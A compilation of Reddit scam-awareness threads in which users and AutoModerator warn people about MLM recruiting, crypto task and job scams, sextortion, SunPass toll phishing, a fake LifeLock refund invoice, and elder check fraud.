- Thank you - though this is the first time I‚Äôm hearing of Amway so I looked it up because I was curious but is Amway focused solely on beauty and health products? Or do they also get into that ‚Äúprofit sharing, directing ad traffic‚Äù kind thing too
- I agree with you - it‚Äôs also always so questionable (and an obvious red flag) when I ask them to provide even just a tiny bit more detail about this ‚Äúawesome opportunity‚Äù and they can‚Äôt give me any answers without scheduling another meeting or inviting me to a conference. Waste of time!
- Thank you!
- first guess "mlm". second guess, some sort of investment Ponzi scheme. The boundaries between these are pretty thin
- "though this is the first time I‚Äôm hearing of Amway"

Oh, you sweet summer child.
- Amway is purely a scam to mislead people into believing they could earn money through it. The only people earning money through it are the top-levels in the pyramid. Beginners will never earn money but are expected to give money to their "up-line", mostly for "training" and product that then fills up their garages unsold. The "directing ad traffic" is pure bullshit and refers to the fact that you'll get your own webshop through which you are expected to hawk Amway products to your family members. It's your classic MLM pyramid scheme.
- Yeah, as far as scams go, Amway is pretty widespread. There are going to be meetings near you.
- Also a sign of the Amway script. They are under strict orders not to disclose the name "Amway" until they get their victim to attend the first hype meeting where an upline guy is trying to hype them up sufficiently for them to want to join and fork over money to the upline. Though I suppose other MLMs will operate in exactly the same way. It's Amway though, for sure, because of everything you said.
- Thank you, it‚Äôs just kind of baffling to me that I can‚Äôt find much online about this specific thing given that it seems to have such large scope. My curiosity is getting the best of me haha
- Thanks for going into detail! lol the only big MLM I‚Äôm familiar with is CutCo but that makes total sense
- I bet you were totally right - shot down the offer for tonight‚Äôs meeting respectfully and when asked why, told them it reminded me of Amway and similar MLM platforms that I was not interested in. They replied ‚Äúmakes sense‚Äù and ‚Äúwe‚Äôre sorry you had bad experiences with something we‚Äôve seen success in‚Äù
- Well I think your research just proved that it actually does not have a large scope.
- Yeah, all part of their script.
- I suppose you‚Äôre right - I guess I thought so because there just so happened to be a meeting tonight in my little town that‚Äôs hours away from where my old teammate lives - was weird that they were able to find a meeting close to me to attend within just a day or two

Title: Someone bought items on amazon japan with my prepaid card
Body: Hi,

Three days ago someone bought something on amazon japan with my prepaid card.

I'm italian and I've never had any account on amazon japan, so my prepaid card data leaked in some way. My card is from Poste Italiane.

  
They bought some item priced at 23,29‚Ç¨ and 10,33‚Ç¨.

  
Let me know if someone in this sub had encountered the same scam and if you have any other information on this.

- There's no more information to be had. Did you buy a physical gift card that was in a publicly accessible shelf on the post office? Scammers will take note of the card numbers, put them back in the shelf and run them on a system until someone loads money into them.

Never buy physical gift cards from a shelf anyone can grab.

Title: Potential cryto scam?
Body: Ive been looking for remote jobs as just a bit of extra money on the side, found one thats apparently data entry but i have been contacted by what seems to be an automated response on whatsapp. They havent asked for any personal details and have stated that no personal details will be asked for, however i have been asked to make a crypto wallet for ‚ÄòUSDT‚Äô to be deposited into it as payment. The pay was also stated to be very high for what the job is (3800USDT per month). Is this too good to be true?

- No legitimate companies pay with crypto. Not a single one.

There is no such thing as "remote work for money on the side". No one is hiring remote work for part time, side gig work.

Remote jobs are real, full time jobs, that require committing 40 hours a week, and also require specialized skills with years of experience to back them up. 99.9999% of remote jobs on the internet are scams.
- Yes it's a scam. People who have remote jobs have specialized and in demand skills. No one is handing out 3800 dollar a month jobs to randos on WhatsApp.
- >Ive been looking for remote jobs

Stop doing that.

!task

!crypto

!job (just to be sure)

Worst case "money mule" and you go to prison
- Stop looking at remote data entry jobs. There is no such thing as remote data entry jobs. All of them are scams.
- "remote job"  
"data entry"  
"whatsapp"  
"crypto"  
"excessively high pay"

¬†Is this too good to be true? Well, what do you think ... it is going to be a scam of some sort
- !job scam of some sort. If you ever see anything like ‚Äúremote data entry‚Äù or ‚Äúvirtual assistant,‚Äù it‚Äôs a scam.
- This is the start of the common !task scam posted here 100x a week. They will give you like $50-$100 at first then later trick you into sending them money in various ways to ‚Äúupgrade‚Äù your level and increase your ‚Äúprofits‚Äù.

Just block and ignore.
- This sounds really sketchy. 

Legit jobs usually don‚Äôt ask you to create a crypto wallet for payment, especially through WhatsApp. The pay also seems way too high for something like data entry. Scammers often use stuff like this to trap people.

Be careful and don‚Äôt share any info!
- Remote job?  Data entry?  Very high pay for nature of work?

Possible !task scam?
- Delete what‚Äôs apps. It‚Äôs a scam app
- Most job offers for remote or work from home jobs are scams. If you're currently looking for a job, spend a little time here to get familiar with job scams so you recognize the signs. Read the automod replies that have already been posted. There are several WFH subs on Reddit, where people who actually have remote jobs share stories and info. But:  beware, on any social media including Reddit, there are scammer lurking and posting. 

Some red flags:

- contacted  on WhatsApp, Instagram, or other social media

- vague impersonal info on their emails to you, like "Dear Applicant"

- interview by text only

- hired right after interview, or hired without interview

- the pay is much too high for the job tasks (US $30 per hour for simple stuff that the average 12 year old could do)

- you have to pay them for something, or "invest" your own money

- they want to send you a check for you to buy equipment (fraud / money laundering)

- job involves re-shipping packages (parcel mule)
- Do you really need to ask? Yes, it‚Äôs a scam.

- Hi /u/Otherwise_Rabbit3049, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

- Hi /u/Otherwise_Rabbit3049, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- Hi /u/Otherwise_Rabbit3049, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

Have you considered it was the person who dropped the Trojan on you?
- If you want to go directly to the site and install it, then you're probably okay but I wouldn't use any links in the email. It could easily be the scammers just trying to regain access to your computer
- Possible !recovery scam. If you want to add more malware protection, get something independently, from a reputable provider whose reputation you already know.

- Hi /u/Malsperanza, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- Stop giving them money.  They will not stop.  Don‚Äôt pick up and keep blocking.  There is no one who will hurt you.  Also watch out for recovery scammers, your money is gone and no one can get it back, there are no magic white hat hackers or secret agents

Lesson learned !sextortion
- Tbh if your nudes are so precious that you're willing to drop $500 to keep them from spreading, why are you sending them to strangers
- It looks like you're very young, so get this lesson - no random woman wants your nudes, anywhere, ever.
- Did sending them 500 quid help? No? Then don‚Äôt send more
- Hi /u/KingTutTot, AutoModerator has been summoned to explain the Sextortion scam.

This scam occurs when you meet a woman/man on dating service/social media site/forum/wherever and they ask you to go on Skype, WhatsApp, Telegram, or another messaging system. They will ask you to exchange naked pictures, and they will usually ask you to include your face in the pictures. They will then threaten to reveal the pictures to your family/friends if you do not pay them. The best thing to do in this situation is block the scammer and go private in your socials for a while. Paying the scammer will not make them back off, and just tells them that it is worth their time to continue threatening you.

If you fell for this scam, we recommend you join the sextortion subreddit and follow the recommendations of their sticky post: https://www.reddit.com/r/Sextortion/comments/n4yorq/new_victims_please_read_first/

Also beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the photos or get back at the extorter. They can't, it's a trick to make you lose more money.

- Thank you
- I really don‚Äôt know honestly I was flustered and being stupid
- Having calmed down I know have realised how stupid I was
- I hope I saved you some money.  Good rule of thumb is don‚Äôt send your genitals to people you don‚Äôt know lol(or at all because they can still use it against you).  Even sexting is a bad idea.  Best of luck
- Thanks, won‚Äôt ever happen again

Title: Floridians Beware of this sun-pass scam
Body: Hello all

1/4 So, my mami received this message and forwarded it to me. In my ignorance, I clicked on the link. 

2/4 It brought me to a page that looked eerily similar to the official SunPass website. I started getting worried that we did somehow owe money but We haven't use our cars in toll areas recently so It couldn't have been for us. I asked her to send me the plate numbers for our car so I go to the main page and see if there was a tab where I could look it up, but every time I went and pressed on the top left corner it would just buffer instead of taking me to a main page. I started thinking nah this gotta be a scam. 

3/4 I asked her to send me a picture of the actual message, and I could immediately tell it was a scam because it had been sent to her via email instead of phone #.

4/4 I then went to the real SunPass website and compared the two... phew, the resemblance is uncanny. Please make sure you don‚Äôt fall for it because I almost did ü§£

- https://www.reddit.com/r/Scams/search/?q=SunPass

Search saves time, and sometimes lives.
- All messages with  "Please reply with Y and then exit the message and then open it again" are scams.
- Scam! It‚Äôs a scam! I get a couple a day for this same thing!!

You will get a letter in the mail from the real organization regarding unpaid tolls. Or go to the actual toll bill website and verify.

Toll billing companies do not text you this crap.
- Yes, it is tricking people to make it seem like "sunpass dot com" but really the address is "com-z8l3. sbs"

The fake USPS text scam also does this often, as seen in the image below

https://preview.redd.it/mgv9rjjqn7ee1.png?width=872&format=png&auto=webp&s=e1ada8ff622cba7cb4920891b10fe05b746581bd
- It‚Äôs not just FL. We got one from another state too
- Just look at the url‚Ä¶ sunpass.com-z813.sbs is not the sun pass website.  They make it kinda look like it but that isn‚Äôt it.
- The variation of this is they just base it on your area code. I get them for a toll road back in my home state due to my cell number. And it‚Äôs for a toll for a road I‚Äôve never been on and an area I‚Äôd rarely even visit.
- Look at the address on the last pic....a Hotmail account....definitely a scam
- Please take the time to learn how URLs and domain names work. In this case, the domain is com-8l3.sbs, clearly not the correct site. The sunpass part is the subdomain, and is always under the control of the domain owner. Spotting when a URL is trying to hide its real domain is a good way to spot scams before even clicking on a link -- legitimate organizations never do that.


Judging whether or not a site is legitimate by how it looks or how it works is NOT a reliable way to determine legitimacy. You're relying on the scammer's laziness and lack of technical prowess to avoid being scammed. The scammer only needs to take the time to make it perfect once, and they can use it forever in the future.

- So thankful I saw this today!
- I've gotten the Phishing messages impersonating the Florida, Georgia, Texas, and Oklahoma turnpikes. You could live in Alaska and still get the scam text impersonating Florida's turnpike authority. Interestingly, the number sending the scam texts is usually Canadian.
- Immediately after reading this, I got a text from the Philippines that I needed to pay my FastTrak Lane tolls, in order to keep my license. Within 5 minutes of scrolling past this post.
- I got one like this today and I live in Virginia, I would have almost fell for it too because I know for a fact I have unpaid tolls due.
- [ Removed by Reddit ]
- I just got a text like this about Fast Trak? I don‚Äôt even know what that is, I do not live in an area with tolls‚Ä¶
- "4 I then went to the real SunPass website and compared the two...¬†"

They like to use text to get people to view these on a mobile browser as viewing it on an actual computer gives you a better field of vision on added or missing details.

"¬†I asked her to send me a picture of the actual message, and I could immediately tell it was a scam because it had been sent to her via email instead of phone #."

I only do business by email as I have more control over who has my email addresses and I have better access to previous history with the merchant/vendor.  I would never interact with anything I did not have a history with the sender.
- FYI it‚Äôs nationwide, attacking every tollway platform.
- I just got one of these a few mins ago, but I knew it was a scam, I laughed at it then blocked and reported as junk

- DO NOT give any money. Ignore her, black and move on. If you give her any money, she will only demand more.

And just to be clear. The "she" is most certainly a "he".
- This is very common, they‚Äôve made the !sextortion autoresponder for it. 

Please read it and follow the advice. If you send any money they‚Äôll only ask for more.
- First, think about who you are dealing with. You were not talking to a girl. You were talking to a guy running a scam. Everything he told you is a lie. Everything.

Now that we've got that out of the way, let's look at your options:

1) You pay: The LIAR says he will delete the pics if you pay. What incentive does a LIAR have to actually follow through on that promise? None. There is no amount of money that can make the scamming lying guy in Nigeria delete anything. If you pay, you will set yourself up for a lifetime of continued payments that will grow larger and larger until you have no resources left.  You can't trust the scammer. You know this.

2) You don't pay: The LIAR says he will post pics and tell all your followers. That takes time. It takes determination. It takes effort that some lazy scammer doesn't really want to put in. Could he go to that effort? Sure. Will he? Doubtful, unless you've really pissed him off somehow. Either way, if he posts them he loses all leverage. So, again, unless you seek some sort of vendetta against him that raises you above the level of all his other victims in terms of his determination to hate you, he'll probably just not bother.

So for case #1 you pay, pay, pay, pay, pay, run out of money and can no longer pay, at which point a really determined scammer could post the pics. #2 you don't pay, and a typical scammer will just move on to another victim.

Choose path #2, because either way the pictures are out there, the threat of them becoming public doesn't change by whether or not you pay, but at least with #2 you haven't lost money along with dignity.

Also, switch your social accounts to private for awhile, go dark. It sucks. Sure. But you can say "Oh a scammer was after me." COMPLETELY DISENGAGE AND BLOCK the scammer. Never respond again. Even if he comes at you through other means, never respond. Responding just gives him hope. Responding makes you more likely to get outed at some point by pissing him off. just block.
- Soon as you make that first payment they are gonna keep asking for more‚Ä¶. Just deactivate your account for few weeks if you can they will just move on to someone else.
- Hey OP someone posted a similar situation a few hours ago and the only difference between you and him is he's been sending money to his blackmailer for half a year. I feel bad for him but I hope instead of doing what he did, you just learn from his mistake and don't even send your blackmailer a single cent because it will never stop even if they say they will delete they won't so like everyone else before me said: block and ignore! If he ever actually sends your pic to your family/friends, just deny everything and say it's AI
- Remember all a video call proves is that they aren't using fake pictures, not that they aren't out to scam you. 

A lot of people start off reasonably skeptical but will let their guard down when they see a live feed or that somebody is local. Intentions know no nationality.
- A few people showed up today who paid. They've just been stuck, afraid and paying forever. 
Never pay blackmailers. 
And seriously, don't send strangers any pictures you don't mind everyone in the world seeing.
- Trying to meet someone online is hell these days. So many scammers. You need to educate yourself.

Real women who are interested in getting to know you will not send you nude photos before meeting you. They won't ask for nude photos. Real women who are actually interested in meeting a guy will not start talking about money or investing before getting deep into an in-person relationship. 

Read through this sub. There are many sad stories here on r/scams of people who have lost money to scams that begin with meeting someone online. They pretend to be interested in you for a few weeks, even longer, and then they move on to the next stage of the scam: stealing your money with sextortion blackmail, or stealing your money with fake crypto trading sites, or advance fee scams.
- Yes always scan their pictures on ProFacefindr

Title: Locked out of my facebook account, when I got back in, seems someone took over my facebook ads? But added new cc's?
Body: Here is a timeline. I just want to make sure I understand what happened.

12/19/24- I log into facebook and see my account was suspend: "You account was suspended because your Instagram account xxxxxx (not my account) doesnt follow our rules. You have x days left to appeal. Log into your linked Instagram account to appeal."

I do not have access to said instagram account, so logging in is impossible. I reach out to a friend who then connects to his friend that works at facebook, and they take around 3 weeks and get my account restored. I needed to provide a new email to connect to the account, because my primary email is apparently blacklisted

1/21/24 - I get a message in my new email that states "Your Facebook ads were approved". I log into Facebook ads and it seems that there were hundreds of ads published under my name between 12/23 to today spending around 2-3 thousand dollars. There were also around 20 people added as admin users. The weird thing is that the credit cards used for the ads were not mine. It seems they used their own money. My only thought is that maybe they needed to use an account in good standing to be able to run ads? Is this a common scam? Regardless, use complicated passwords and 2 factor auth.

That's not how you contact support.
- "The weird thing is that the credit cards used for the ads were not mine. It seems they used their own money."


I doubt it was their own money. Probably stolen cards.
- On the original message from "facebook" that said it was suspended, who EXACTLY was it it from?


Also, what web address did their supplied link go to? Exact address¬†


¬†Im gonna assume it was someone pretending to be support
- Stolen CC numbers and it all tracks to your account. Of course scammers have to pay for the ads that suck the victims in, and all fb cares about is that they got paid. Contact fb and at least make them aware of the issue. You really should have contacted them in the beginning since it now makes you at least look more suspicious.
- >Regardless, use complicated passwords and 2 factor auth. 

And I'll add to this: use **unique** passwords. Every single account someone has should have a different password. 

The main danger here, and possibly the reason your account was taken over, is that if any service you have an account with has their servers get compromised, and if the attackers gain access to emails, usernames, and passwords, they'll immediately attempt to use those credentials with every single bank, email provider, social media platform, streaming service, and subscription service out there. And if you used that same password anywhere else, they'll gain access to that account.
- Bet. Just glad it wasn‚Äôt mine at least. I believe I likely had a card on there, so I‚Äôm surprised it wasn‚Äôt mine.
- Scammer MO: 1) Create website selling name brand stuff for 85% off. 2) Take over a Facebook account via compromised login/pw available for sale or trade on Dark Web. 3) If Facebook account has an attached credit card, use it to run promoted ads for the scam storefront. If not, use stolen credit card numbers (also purchased on the Dark Web). 4) Take orders on storefront but indicated shipping will be 3-4 weeks, enough time to cash out before being shut down. 5) Use, sell, or trade the credit card data you just stole from people thinking they were going to get 85% off whatever.
- This was a message when logging into Facebook, not an email
- Never said it was an email...


And who exactly sent the message? For example, Facebooksupport175?

Title: New to me LifeLock scam
Body: My wife received an email about her recently purchased LifeLock. Well, we know it's not real because she has not purchased anything from Norton. I'm the one who does that type of purchase. 

The scam has an invoice picture in it and was sent both from and to randomly generated, probably single use, gmail addresses. I have added what I found wrong with the "invoice", below. 

A. Invoice? For who? Norton wants you to know who your buying stuff from.
B. Too much open space here, bad formatting.
C. Multi-million dollar company will put your name here.
D. Wording here is off.
E. More grammar errors.
F. Nortons "Customer Help Center" is actually called "Customer Support."
G. This number has been labeled as a scam call center forwarding number. It is also incorrectly formatted.
H. "Id" is usually capitalized. 
I. First, the comma is incorrect. Secondly, the Cust ID # is not something Norton shares to customers as your account is referenced by your email. The Billed to should have only the customers information and would have nothing to do with the invoice information.
J. That is not what it is called. It is called "Norton 360 with 'LifeLock Select' or 'LifeLock Ultimate Plus' "
K. What no tax? Nothing they sell would get this even amount. (obviously dependent on your state)
L. None of the numbers listed on this page are correct for Norton products or order numbers or invoices. That is not the right format.
M. This block of information is not centered or has the same sized fonts.
N. What is with the piecemealed text here?
O. More grammatical errors. Oh yeah, ePayment specialists...Norton has a whole department dedicated to ePayments???
P. This number has been labeled as a scam call center forwarding number.
Q. It is also incorrectly formatted.
R. "Remitance" is spelled incorrectly; it is also not a common word in the US. Still used and is proper, but is just not that common.
S. ". ...answer payment and remitance delivery questions... Um...wut? What does this even mean?
T. What customer help center/help desk/customer care/customer support has the hours of 0730-1200.
U. Eastern, Central, Mountain...Standard Time??? Better yet, how about India Standard Time (Mumbi).
V. Once again, which is it??? Customer Care now huh???
W. The wording here is totally off, why the colon and why the caps? Just sloppy grammar.
X. Dude‚Ä¶WTH? "Digitally Yours?" Norton is a Multi-Million Dollar company!
Y. Here we go!!! Now it‚Äôs "Customer Support".
Z. Back to this incorrectly formatted number again!!! Also, why the +1? Norton is an American company and this BS invoice is being sent to an American (presumably), in America. If it were being sent to an individual in the UK, it would NOT have them call a US based customer support. It would be a UK based number. It may forward that call to a call-center in the US, but the number would not need to be international. In the end, these are just the errors I found in this scam email.

I hope this finds everyone more aware of a maybe new scam.   Good luck all and stay aware.

- This whole scam is to get you to call that number (G), (P/Q) and (Z).

Once you call that number, you are forwarded to an Indian scam call center and they run the !refund scam on you.

Protip: No business will ever spend half the space on the receipt/invoice trying to convince to call them for a refund. That‚Äôs not a very good business model.
- !refund
- Just ignore emails saying you'll be charged for something you didn't authorize. It's 99% going to a scam. If you actually see a charge, take it up with your bank/credit card.
- BTW, the LifeLock part is just one of the always-changing fake details of the scam; it's not really a "LifeLock scam". The refund scam abuses many different kinds of trademarks, such as Amazon, Paypal, Norton, McAfee, Geek Squad, etc. Sometimes they even pretend that you made a Bitcoin purchase.

But this incredibly common scam always has one consistent feature: they say you have bought (or are about to buy) an expensive item and you need to call them to stop or refund the transaction.

Also, just to show how common this is, I would say it's posted here in our sub about 5-10 times a day (you don't see a lot of them because they get removed for not redacting the phone number).
- That table in JKL is pretty much a standard template in every scam email. I know the layout and font I've seen it so many times
- Thank you for spending the time, but this isn‚Äôt new scam. This is posted 100x a week here. The brand name changes but the scam is to get you to call this number.
- This is a typical scam email for any data-breached email address.  I call this and the "Hi Pervert" bitcoin email part of the data breached email address "Welcome Kit".
- Yea first time I have seen Life lock used as the "product" but otherwise this scam has been around for a while.   Usually Best Buy or Norton Antivirus.

- Hi /u/erishun, AutoModerator has been summoned to explain the Refund scam.

Refund scams usually start with a spam email about a fake transaction, although they can also be sent through SMS or any other messaging service. The message will provide you with a phone number to call if you want to cancel the transaction, and if you call the scammers will try to get you to provide credit card or banking information in order to receive your refund. Scammers have been taking advantage of Paypal's invoice system to send out realistic scam emails through Paypal itself, here is a news article about that technique: https://krebsonsecurity.com/2022/08/paypal-phishing-scam-uses-invoices-sent-via-paypal/. Here is a Snopes article regarding the Norton variant of this scam: https://www.snopes.com/fact-check/norton-email-renewal-scam/

If you know someone that fell for a refund scam, sit down together to watch this video by Jim Browning and try to retrace their steps: https://youtu.be/X4PllvUowaQ

Title: My dad is writing checks to companies that don't exist?
Body: He is in his late 70's, and has memory issues. We assume these must have been some scams he got in the mail? He doesn't remember writing them. Googling doesn't really come up with much, if anything.

Global Mega SVC (x2)... looks to be a car rental place that is no longer around, but he never had any car rentals that I'm aware of, let alone twice, or for such a period of time that it would cost $1500.

DVR XBOX SVC... he definitely does not have an Xbox, and doesn't even have DVR for his cable, and I'm sure if this service even exists, it does not cost -that- much.

ATV Service LLC... again, definitely does not have an ATV, and has never even ridden one.

These checks have all cleared already, unfortunately.

It sounds like this is all just one "company" and they're making up names knowing he'll just write a check. We've tried telling him to ONLY write checks for his cell phone bill, and left notes on his checkbook, but he doesn't remember, and the notes get misplaced.

I don't know what else to do here, maybe change everything to direct withdrawal and get rid of his checkbooks, but he uses checks for car maintenance and things like that, changing to debit would probably help too, but old people and change do not go well together. He is quite stubborn, and gets defensive (like anyone would) when asked how this is happening, or why he's writing checks for things without asking us.

- This is a wake-up call. Difficult though it is for any family, you need to take control of his finances. Scams are so widespread now, and target older people so relentlessly, that he is very vulnerable. $1500 is cheap compared to what a skilled scammer could get.

Tell him there's no need to feel defensive - the scammers are extremely skilled, and everyone makes mistakes. But the risks are huge and you and he need to collaborate in strengthening his protections. 

Put as many of his regular payments as possible on automatic payment and check his bank statement and credit card every month. Have other bills sent to you, if possible.

See if he's willing to make you a cosigner for his major assets - his retirement funds, his home (mortgage and deed), etc. And leave just monthly money in his checking account - enough for food and normal stuff.

Cancel any debit cards he may have - they are not safe.

Put a filter on his phone that blocks all unknown numbers.

Add more security filters on his computer and check that his passwords are not duplicated.

Etc.
- You should consider seeking power of attorney and have someone take over his finances before he really gets scammed.
- Can‚Äôt the banks give you more information about these companies, at least the bank that the checks were deposited in? 

Are you sure they aren‚Äôt DBA names (doing business as)  for someone posing as lawn care / maintenance or what have you?

You might use your state‚Äôs DBA registry if you can find the owner‚Äôs names. 

Worth a shot at least.
- Does the bank give you the back of the check also?  It should have the bank and account information where the check was deposited (but its been a long time since I examined a cleared check).  It will have an endorsement stamp or signature that may be a clue (like... its the same for all).
- Has your dad seen a neurologist yet for his cognitive issues?  If not he needs to go ASAP.

My MIL has Lewy Body dementia and she got to the point where her kids had to take over her finances.  Fortunately she wasn't scammed, she just stopped paying important bills like the power and water utilities.
- I feel you!  My father has been scammed to the max and you guys are so lucky right now!  I wish my father was only out $1500.  My father continues to this day and gets so mad at me when I confront him about the bullshit!

You need to take control it‚Äôs only going to get worse!
- ‚Äú‚Ä¶scams he got in the mail?‚Äù    Could it be someone coming to his door scamming him to get payments?  Maybe the same person?  Is there a surveillance system in the area that maybe you can check against the dates on the check.  Just thinking maybe they are taking the checks to his bank to cash (which is why you can‚Äôt find a company with that name) and bank surveillance might show who is cashing the checks.
- Having dealt with a parent with alzhiemers you can never stay ahead of it. You have to take over his finances completely. Give him a prepaid visa card for expenses. If he won't go along you'll probably have to get him declared incompetent. Also, please don't let him drive.
- OP's family needs to seek a court-ordered guardianship not a POA.  The grantor of a POA can rescind it at any time and it doesn't give the grantee control over the grantor's finances.

Title: Is this normal on facebook marketplace or is this a scam?
Body: I've been looking for a New 3Ds XL and I saw one on facebook marketplace for $95 with no visible issues and the charger which is a really good deal compared to most of the ones I've seen. When I reached out, the seller said they could only ship and when I look at their seller profile, they have a bunch of other nintendo consoles that were marked as "just listed". When I go to their facebook profile, it's a lot of reposted AI art. Is this a scam or am I being needlessly suspicious of them?

- !advancefee
- Hi /u/Otherwise_Rabbit3049, AutoModerator has been summoned to explain the Advance fee scam.

The [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam) arises from many different situations: investment opportunities, money transfers, job scams, online purchases of any type and any legality, etc., but the bottom line is always the same, you're expected to pay money to receive money. So you will pay the scammer and receive nothing.

It can be as simple as the scammer asking you to pay them upfront for an item they have listed, or as complex as a drug scam that involves an initial scam site, a scam shipping site, and fake government agents. Sometimes the scammers will simply take your first payment and dissappear, but sometimes they will take your initial payment and then make excuses that lead to you making additional payments.

If you are involved in an advance-fee scam, you should attempt to dispute/chargeback any payments sent to the scammer, you should block the scammer, and you should ignore them if they attempt to contact you again. Thanks to redditor AceyAceyAcey for this script.

Title: A whole new romance blackmail scam in Italy and probably worldwide
Body: It all starts by answering a fortune teller ad, she (presumably since it all happens via chat, whatsapp/telegram) sells rituals to let an ex come back. Those rituals by the formulas and the way ingredients are expressed takes obviously advantage of an italian resident consultants, and the fortune teller asks for video proofs the way they are performed, some has to be done naked, you can already guess how it ends : either you pay, or they‚Äôll be going public. The way of paying also implies somebody from Italy made a good consultancy jobs as rechargable credit cards released by the post office are used. Now by the interviews the victims claim all of the payments have to be done to different card holders, the host tracked back one who was unaware the card was issued in his name but could obtain a movement list and they saw all the money disappered in crypto, never to come back as well as no ex, but also a good part used to buy goods in Benin, Africa - whatelse is new. Also part of the whatsapp service messages shows up the correspondent is french speaking. Just to grow the business, as a favor for a discount, the victims are asked to issue new cards to became one of those beneficiaries themselves. The fortune teller number owner was eventually found to be unrelated to the scam operation. Just the interviewed victims sums up a grandtotal of 750 grands per month. Chapo Guzman and every organized crime or drug cartel member would be very happy to go housemaid these people anytime.

Sorry it‚Äôs in italian.

Title: I believe this is a scam
Body: I was just offered what seems to be an amazing job. They had me fill out my interview all in writing, which I did and really took the time to think it all out.
I then get an email announcing that I got the job but they will send me funds to purchase the equipment.
This through up red flags. Isn‚Äôt the company supposed to just send me the equipment from them and then I can have assistance if needed to set it up? I shouldn‚Äôt have to research what I need.
Another red flag was that I have not met with anyone or spoken verbally to them. Everything has only been done through email. This was in response to me filing out an application on LinkedIn for the job. I figured all those are legit. üòî kind of bummed but I just wanted confirmation that I have the right vibes about this being fishy.

- Yes, this is a !fakecheck scam
- >Isn‚Äôt the company supposed to just send me the equipment

Yes.  That is how every single real business operates.

>Another red flag was that I have not met with anyone or spoken verbally to them. Everything has only been done through email.

Yep, that's also an indication that this is a scam.  Real companies will do, at **minimum**, a phone screening.  The vast majority will also want either a video interview, or an in-person interview.  No real company does text-only interviews.

>This was in response to me filing out an application on LinkedIn for the job. I figured all those are legit.

Sadly, that's not the case.  You always have to be on your toes.

In this case, the scam is the common "fake check" scam.  They send you a fake check.  You deposit it and the funds show up in your account, but you're unaware that these are just *provisional* funds pending the check actually clearing.  You "purchase supplies" from their "vendor" (i.e. send money directly back to the scammer).  When the check eventually gets flagged as fraudulent, the full value will be clawed back out of your account, but any money you sent the scammer remains gone.
- >This offer expires

Scams are really sounding like FOMO-laden videogames. Help!
